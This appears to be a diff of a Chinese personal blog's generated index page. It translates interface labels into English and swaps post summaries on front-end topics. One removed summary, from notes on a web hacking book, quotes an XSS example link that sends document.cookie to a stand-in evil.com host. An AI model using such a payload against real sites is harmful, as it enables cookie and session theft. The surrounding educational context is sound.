@@ -48,7 +48,7 @@
 				<h1 class="site-name"><a href="/" title="圆玉的博客">圆玉的博客</a></h1>
 				<h2 class="blog-motto"></h2>
 			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
 			</a></div>
 			<nav class="animated">
 				<ul>
@@ -62,7 +62,7 @@
  					
 					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
 						<label>Search</label>
-						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
 						<input type="hidden" name="q" value="site:lry1994.github.io">
 					</form>
 					
@@ -77,15 +77,37 @@
   
 <section class="post" itemscope itemprop="blogitem">
   
-    <a href="/study/2018/6/webSafety.html" title="读《web前端黑客技术揭秘》" itemprop="url">
+    <a href="/study/2018/6/suibi.html" title="2018-6总结" itemprop="url">
   
-    <h1 itemprop="name">读《web前端黑客技术揭秘》</h1>
+    <h1 itemprop="name">2018-6总结</h1>
     
      
-           <p itemprop="description" >XSS 跨站脚本攻击如果攻击者构造出如下链接：http://www.foo.com/info.html#new%20Image().src=&amp;quot;http://www.evil.com/steal.php?c=&amp;quot;+escape(document.cookie)浏览</p>
+           <p itemprop="description" >await/async最佳实践第一个例子1234567(async ()=&amp;gt;&amp;#123;    const pizzaPromise = selectPizza();//同时执行    const drinkPromise = selectDrink();//同时执行   </p>
         
     
     <time datetime="2018-05-31T16:00:00.000Z" itemprop="datePublished">2018-06-01</time>
+  </a>
+</section>
+
+
+
+
+
+
+  
+<section class="post" itemscope itemprop="blogitem">
+  
+    <a href="/study/Comprehensive/interview.html" title="面试题摘录" itemprop="url">
+  
+    <h1 itemprop="name">面试题摘录</h1>
+    
+     
+           <p itemprop="description" >vue数据双向绑定的原理主要讲了实现是基于Object.defineProperty另外也大概阐述了发布-订阅者模式，主要是Observer，Dep，Watcher等
+JSONP可以用post请求吗？为什么？不支持因为script标签只支持get请求…
+描述一下css的盒模型标准</p>
+        
+    
+    <time datetime="2018-05-04T16:00:00.000Z" itemprop="datePublished">2018-05-05</time>
   </a>
 </section>
 
@@ -107,28 +129,6 @@ foreach数组的foreach可以和闭包起一样的作用
 闭包中的变量包括参数，在内部函数执行完毕之前不会被释放
 JS运行机制执行栈,任务队列
 process.nextTick方法可以在当前”执行栈”的尾部—-下一次Event Loop（主线</p>
-        
-    
-    <time datetime="2018-05-04T16:00:00.000Z" itemprop="datePublished">2018-05-05</time>
-  </a>
-</section>
-
-
-
-
-
-
-  
-<section class="post" itemscope itemprop="blogitem">
-  
-    <a href="/study/Comprehensive/interview.html" title="面试题摘录" itemprop="url">
-  
-    <h1 itemprop="name">面试题摘录</h1>
-    
-     
-           <p itemprop="description" >vue数据双向绑定的原理主要讲了实现是基于Object.defineProperty另外也大概阐述了发布-订阅者模式，主要是Observer，Dep，Watcher等
-JSONP可以用post请求吗？为什么？不支持因为script标签只支持get请求…
-描述一下css的盒模型标准</p>
         
     
     <time datetime="2018-05-04T16:00:00.000Z" itemprop="datePublished">2018-05-05</time>
@@ -287,30 +287,14 @@ Launch</p>
   
 <section class="post" itemscope itemprop="blogitem">
   
-    <a href="/study/2018/2/26-dom-compaticity.html" title="原生DOM兼容特性总结" itemprop="url">
+    <a href="/study/2018/2/26-rebuild-blog.html" title="搭建博客过程" itemprop="url">
   
-    <h1 itemprop="name">原生DOM兼容特性总结</h1>
+    <h1 itemprop="name">搭建博客过程</h1>
     
      
-           <p itemprop="description" >浏览器主要也就是IE有点独特，所以把IE重点区分开
-
-
-
-名称
-主流
-IE
-
-
-
-
-内文本
-innerText
-textContent
-
-
-请求对象
-XMLHttpRequest
-ActiveXObject[“MSXML2.XMLHttp.6.0”,”MSXML2.XMLHttp</p>
+           <p itemprop="description" >我是一个很喜欢做笔记的人，老是写在word文档不方便。之前用jekyll搭了一个，感觉写得也是乱七八糟，页面也不好看，改的话不如重新重写一个好了
+有了上次经验，觉得做一个东西真的要认真规划一下，不然做出来的东西老是迁就的感觉，能用就行。这样是不行的。像做一个产品来做它
+源码地址 </p>
         
     
     <time datetime="2018-02-25T16:00:00.000Z" itemprop="datePublished">2018-02-26</time>
@@ -328,15 +312,15 @@ ActiveXObject[“MSXML2.XMLHttp.6.0”,”MSXML2.XMLHttp</p>
   </nav>
 
 </div>
-      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
 
 <div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
 <aside class="clearfix">
 
   
 <div class="categorieslist">
-	<p class="asidetitle">分类</p>
+	<p class="asidetitle">Categories</p>
 		<ul>
 		
 		  
@@ -353,11 +337,11 @@ ActiveXObject[“MSXML2.XMLHttp.6.0”,”MSXML2.XMLHttp</p>
 
   
 <div class="tagslist">
-	<p class="asidetitle">标签</p>
+	<p class="asidetitle">Tags</p>
 		<ul class="clearfix">
 		
 			
-				<li><a href="/tags/日常记录/" title="日常记录">日常记录<sup>18</sup></a></li>
+				<li><a href="/tags/日常记录/" title="日常记录">日常记录<sup>17</sup></a></li>
 			
 		
 			
@@ -365,15 +349,11 @@ ActiveXObject[“MSXML2.XMLHttp.6.0”,”MSXML2.XMLHttp</p>
 			
 		
 			
-				<li><a href="/tags/读书笔记/" title="读书笔记">读书笔记<sup>8</sup></a></li>
+				<li><a href="/tags/读书笔记/" title="读书笔记">读书笔记<sup>9</sup></a></li>
 			
 		
 			
 				<li><a href="/tags/面经/" title="面经">面经<sup>6</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/设计模式/" title="设计模式">设计模式<sup>1</sup></a></li>
 			
 		
 		</ul>
@@ -383,7 +363,7 @@ ActiveXObject[“MSXML2.XMLHttp.6.0”,”MSXML2.XMLHttp</p>
   
 
 <div class="doubanshow">
-<p class="asidetitle">豆瓣秀</p>
+<p class="asidetitle">Douban Show</p>
 <div>
 <script type="text/javascript" src="http://www.douban.com/service/badge/167927352/?show=collection&amp;n=12&amp;columns=3&amp;hidelogo=yes&amp;hideself=yes&amp;cat=book|movie" ></script>
 </div>
@@ -391,11 +371,11 @@ ActiveXObject[“MSXML2.XMLHttp.6.0”,”MSXML2.XMLHttp</p>
 
 
   <div class="rsspart">
-	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
 </div>
 
   <div class="weiboshow">
-  <p class="asidetitle">新浪微博</p>
+  <p class="asidetitle">Weibo</p>
     <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=2140938987&verifier=b3593ceb&dpc=1"></iframe>
 </div>
 
@@ -553,7 +533,7 @@ var _hmt = _hmt || [];
 <!-- Totop Begin -->
 
 	<div id="totop">
-	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
 	</div>
 	<script src="/js/totop.js"></script>
 
